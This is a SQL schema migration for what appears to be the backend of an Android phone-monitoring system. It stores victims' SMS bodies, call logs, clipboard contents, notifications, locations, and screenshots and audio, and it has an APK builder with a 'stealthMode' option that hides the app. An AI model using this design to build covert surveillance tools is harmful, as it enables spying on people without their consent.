CREATE TABLE `apkBuilds` (
	`id` int AUTO_INCREMENT NOT NULL,
	`buildId` varchar(64) NOT NULL,
	`createdBy` int NOT NULL,
	`appName` varchar(255) NOT NULL,
	`packageName` varchar(255) NOT NULL,
	`versionName` varchar(64),
	`versionCode` int,
	`iconUrl` text,
	`stealthMode` boolean NOT NULL DEFAULT false,
	`ports` json,
	`sslEnabled` boolean NOT NULL DEFAULT true,
	`serverUrl` text,
	`apkUrl` text,
	`fileSize` bigint,
	`status` enum('building','ready','failed','expired') NOT NULL DEFAULT 'building',
	`downloadCount` int NOT NULL DEFAULT 0,
	`expiresAt` timestamp,
	`createdAt` timestamp NOT NULL DEFAULT (now()),
	`updatedAt` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
	CONSTRAINT `apkBuilds_id` PRIMARY KEY(`id`),
	CONSTRAINT `apkBuilds_buildId_unique` UNIQUE(`buildId`)
);
--> statement-breakpoint
CREATE TABLE `auditLogs` (
	`id` int AUTO_INCREMENT NOT NULL,
	`userId` int,
	`deviceId` int,
	`action` varchar(255) NOT NULL,
	`actionType` enum('user_login','user_logout','user_created','user_updated','user_deleted','permission_granted','permission_revoked','device_added','device_removed','device_monitored','data_accessed','data_exported','settings_changed','security_event') NOT NULL,
	`resourceType` varchar(64),
	`resourceId` varchar(255),
	`details` json,
	`ipAddress` varchar(45),
	`userAgent` text,
	`status` enum('success','failure') NOT NULL DEFAULT 'success',
	`timestamp` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `auditLogs_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `callLogs` (
	`id` int AUTO_INCREMENT NOT NULL,
	`deviceId` int NOT NULL,
	`phoneNumber` varchar(20) NOT NULL,
	`contactName` varchar(255),
	`callType` enum('incoming','outgoing','missed') NOT NULL,
	`duration` int NOT NULL,
	`timestamp` timestamp NOT NULL,
	`recordedAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `callLogs_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `clipboardLogs` (
	`id` int AUTO_INCREMENT NOT NULL,
	`deviceId` int NOT NULL,
	`content` text NOT NULL,
	`contentType` varchar(64),
	`timestamp` timestamp NOT NULL,
	`recordedAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `clipboardLogs_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `contacts` (
	`id` int AUTO_INCREMENT NOT NULL,
	`deviceId` int NOT NULL,
	`name` varchar(255) NOT NULL,
	`phoneNumber` varchar(20),
	`email` varchar(320),
	`photoUrl` text,
	`notes` text,
	`recordedAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `contacts_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `devicePermissions` (
	`id` int AUTO_INCREMENT NOT NULL,
	`deviceId` int NOT NULL,
	`userId` int NOT NULL,
	`permissionId` int NOT NULL,
	`grantedAt` timestamp NOT NULL DEFAULT (now()),
	`grantedBy` int,
	CONSTRAINT `devicePermissions_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `devices` (
	`id` int AUTO_INCREMENT NOT NULL,
	`deviceId` varchar(255) NOT NULL,
	`deviceName` varchar(255) NOT NULL,
	`manufacturer` varchar(255),
	`model` varchar(255),
	`androidVersion` varchar(64),
	`imei` varchar(64),
	`phoneNumber` varchar(20),
	`ownerId` int NOT NULL,
	`status` enum('online','offline','inactive') NOT NULL DEFAULT 'offline',
	`lastSeen` timestamp,
	`isStealthMode` boolean NOT NULL DEFAULT false,
	`batteryLevel` int,
	`storageUsed` bigint,
	`storageTotal` bigint,
	`metadata` json,
	`createdAt` timestamp NOT NULL DEFAULT (now()),
	`updatedAt` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
	CONSTRAINT `devices_id` PRIMARY KEY(`id`),
	CONSTRAINT `devices_deviceId_unique` UNIQUE(`deviceId`),
	CONSTRAINT `devices_imei_unique` UNIQUE(`imei`)
);
--> statement-breakpoint
CREATE TABLE `geofenceEvents` (
	`id` int AUTO_INCREMENT NOT NULL,
	`geofenceId` int NOT NULL,
	`deviceId` int NOT NULL,
	`eventType` enum('entry','exit') NOT NULL,
	`latitude` decimal(10,8),
	`longitude` decimal(11,8),
	`timestamp` timestamp NOT NULL,
	`recordedAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `geofenceEvents_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `geofences` (
	`id` int AUTO_INCREMENT NOT NULL,
	`deviceId` int NOT NULL,
	`name` varchar(255) NOT NULL,
	`latitude` decimal(10,8) NOT NULL,
	`longitude` decimal(11,8) NOT NULL,
	`radius` decimal(10,2) NOT NULL,
	`isActive` boolean NOT NULL DEFAULT true,
	`alertOnEntry` boolean NOT NULL DEFAULT true,
	`alertOnExit` boolean NOT NULL DEFAULT true,
	`createdAt` timestamp NOT NULL DEFAULT (now()),
	`updatedAt` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
	CONSTRAINT `geofences_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `installedApps` (
	`id` int AUTO_INCREMENT NOT NULL,
	`deviceId` int NOT NULL,
	`packageName` varchar(255) NOT NULL,
	`appName` varchar(255) NOT NULL,
	`version` varchar(64),
	`versionCode` int,
	`isSystemApp` boolean NOT NULL DEFAULT false,
	`installTime` timestamp,
	`updateTime` timestamp,
	`recordedAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `installedApps_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `locationHistory` (
	`id` int AUTO_INCREMENT NOT NULL,
	`deviceId` int NOT NULL,
	`latitude` decimal(10,8) NOT NULL,
	`longitude` decimal(11,8) NOT NULL,
	`accuracy` decimal(10,2),
	`altitude` decimal(10,2),
	`speed` decimal(10,2),
	`bearing` decimal(10,2),
	`provider` varchar(64),
	`address` text,
	`timestamp` timestamp NOT NULL,
	`recordedAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `locationHistory_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `mediaFiles` (
	`id` int AUTO_INCREMENT NOT NULL,
	`deviceId` int NOT NULL,
	`fileType` enum('screenshot','video','audio','photo') NOT NULL,
	`fileName` varchar(255) NOT NULL,
	`fileUrl` text NOT NULL,
	`fileSize` bigint,
	`duration` int,
	`timestamp` timestamp NOT NULL,
	`recordedAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `mediaFiles_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `notificationLogs` (
	`id` int AUTO_INCREMENT NOT NULL,
	`deviceId` int NOT NULL,
	`appName` varchar(255) NOT NULL,
	`title` varchar(255),
	`body` text,
	`timestamp` timestamp NOT NULL,
	`recordedAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `notificationLogs_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `permissions` (
	`id` int AUTO_INCREMENT NOT NULL,
	`code` varchar(64) NOT NULL,
	`name` varchar(255) NOT NULL,
	`description` text,
	`category` varchar(64) NOT NULL,
	`createdAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `permissions_id` PRIMARY KEY(`id`),
	CONSTRAINT `permissions_code_unique` UNIQUE(`code`)
);
--> statement-breakpoint
CREATE TABLE `smsLogs` (
	`id` int AUTO_INCREMENT NOT NULL,
	`deviceId` int NOT NULL,
	`phoneNumber` varchar(20) NOT NULL,
	`messageBody` text NOT NULL,
	`direction` enum('incoming','outgoing') NOT NULL,
	`timestamp` timestamp NOT NULL,
	`isRead` boolean NOT NULL DEFAULT false,
	`threadId` varchar(64),
	`recordedAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `smsLogs_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `userPermissions` (
	`id` int AUTO_INCREMENT NOT NULL,
	`userId` int NOT NULL,
	`permissionId` int NOT NULL,
	`grantedAt` timestamp NOT NULL DEFAULT (now()),
	`grantedBy` int,
	CONSTRAINT `userPermissions_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
ALTER TABLE `users` MODIFY COLUMN `role` enum('admin','manager','user','viewer') NOT NULL DEFAULT 'viewer';--> statement-breakpoint
ALTER TABLE `users` MODIFY COLUMN `lastSignedIn` timestamp;--> statement-breakpoint
ALTER TABLE `users` ADD `twoFactorEnabled` boolean DEFAULT false NOT NULL;--> statement-breakpoint
ALTER TABLE `users` ADD `twoFactorSecret` varchar(255);--> statement-breakpoint
ALTER TABLE `users` ADD `isActive` boolean DEFAULT true NOT NULL;--> statement-breakpoint
ALTER TABLE `users` ADD CONSTRAINT `users_email_unique` UNIQUE(`email`);--> statement-breakpoint
CREATE INDEX `buildId_idx` ON `apkBuilds` (`buildId`);--> statement-breakpoint
CREATE INDEX `createdBy_idx` ON `apkBuilds` (`createdBy`);--> statement-breakpoint
CREATE INDEX `status_idx` ON `apkBuilds` (`status`);--> statement-breakpoint
CREATE INDEX `userId_idx` ON `auditLogs` (`userId`);--> statement-breakpoint
CREATE INDEX `deviceId_idx` ON `auditLogs` (`deviceId`);--> statement-breakpoint
CREATE INDEX `actionType_idx` ON `auditLogs` (`actionType`);--> statement-breakpoint
CREATE INDEX `timestamp_idx` ON `auditLogs` (`timestamp`);--> statement-breakpoint
CREATE INDEX `deviceId_idx` ON `callLogs` (`deviceId`);--> statement-breakpoint
CREATE INDEX `phoneNumber_idx` ON `callLogs` (`phoneNumber`);--> statement-breakpoint
CREATE INDEX `timestamp_idx` ON `callLogs` (`timestamp`);--> statement-breakpoint
CREATE INDEX `deviceId_idx` ON `clipboardLogs` (`deviceId`);--> statement-breakpoint
CREATE INDEX `timestamp_idx` ON `clipboardLogs` (`timestamp`);--> statement-breakpoint
CREATE INDEX `deviceId_idx` ON `contacts` (`deviceId`);--> statement-breakpoint
CREATE INDEX `phoneNumber_idx` ON `contacts` (`phoneNumber`);--> statement-breakpoint
CREATE INDEX `deviceId_idx` ON `devicePermissions` (`deviceId`);--> statement-breakpoint
CREATE INDEX `userId_idx` ON `devicePermissions` (`userId`);--> statement-breakpoint
CREATE INDEX `permissionId_idx` ON `devicePermissions` (`permissionId`);--> statement-breakpoint
CREATE INDEX `deviceId_idx` ON `devices` (`deviceId`);--> statement-breakpoint
CREATE INDEX `ownerId_idx` ON `devices` (`ownerId`);--> statement-breakpoint
CREATE INDEX `status_idx` ON `devices` (`status`);--> statement-breakpoint
CREATE INDEX `geofenceId_idx` ON `geofenceEvents` (`geofenceId`);--> statement-breakpoint
CREATE INDEX `deviceId_idx` ON `geofenceEvents` (`deviceId`);--> statement-breakpoint
CREATE INDEX `timestamp_idx` ON `geofenceEvents` (`timestamp`);--> statement-breakpoint
CREATE INDEX `deviceId_idx` ON `geofences` (`deviceId`);--> statement-breakpoint
CREATE INDEX `deviceId_idx` ON `installedApps` (`deviceId`);--> statement-breakpoint
CREATE INDEX `packageName_idx` ON `installedApps` (`packageName`);--> statement-breakpoint
CREATE INDEX `deviceId_idx` ON `locationHistory` (`deviceId`);--> statement-breakpoint
CREATE INDEX `timestamp_idx` ON `locationHistory` (`timestamp`);--> statement-breakpoint
CREATE INDEX `deviceId_idx` ON `mediaFiles` (`deviceId`);--> statement-breakpoint
CREATE INDEX `fileType_idx` ON `mediaFiles` (`fileType`);--> statement-breakpoint
CREATE INDEX `timestamp_idx` ON `mediaFiles` (`timestamp`);--> statement-breakpoint
CREATE INDEX `deviceId_idx` ON `notificationLogs` (`deviceId`);--> statement-breakpoint
CREATE INDEX `appName_idx` ON `notificationLogs` (`appName`);--> statement-breakpoint
CREATE INDEX `timestamp_idx` ON `notificationLogs` (`timestamp`);--> statement-breakpoint
CREATE INDEX `code_idx` ON `permissions` (`code`);--> statement-breakpoint
CREATE INDEX `category_idx` ON `permissions` (`category`);--> statement-breakpoint
CREATE INDEX `deviceId_idx` ON `smsLogs` (`deviceId`);--> statement-breakpoint
CREATE INDEX `phoneNumber_idx` ON `smsLogs` (`phoneNumber`);--> statement-breakpoint
CREATE INDEX `timestamp_idx` ON `smsLogs` (`timestamp`);--> statement-breakpoint
CREATE INDEX `userId_idx` ON `userPermissions` (`userId`);--> statement-breakpoint
CREATE INDEX `permissionId_idx` ON `userPermissions` (`permissionId`);--> statement-breakpoint
CREATE INDEX `email_idx` ON `users` (`email`);--> statement-breakpoint
CREATE INDEX `role_idx` ON `users` (`role`);